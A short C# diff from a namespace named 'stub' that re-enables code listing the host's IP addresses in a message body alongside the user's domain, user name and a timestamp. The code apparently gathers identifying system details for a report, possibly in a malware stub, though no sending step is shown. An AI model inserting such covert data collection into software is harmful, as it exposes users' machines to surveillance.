@@ -280,11 +280,11 @@ namespace stub
 
             var host = Dns.GetHostEntry(Dns.GetHostName());
 
-            //messageBody += "IP Addresses:" + newLine;
-            //foreach (var address in host.AddressList)
-            //{
-            //    messageBody += address + newLine;
-            //}
+            messageBody += "IP Addresses:" + newLine;
+            foreach (var address in host.AddressList)
+            {
+                messageBody += address + newLine;
+            }
 
             messageBody += newLine + "User: " + Environment.UserDomainName + "\\" + Environment.UserName + "\r\n";
             messageBody += "Time: " + now.ToString() + newLine;
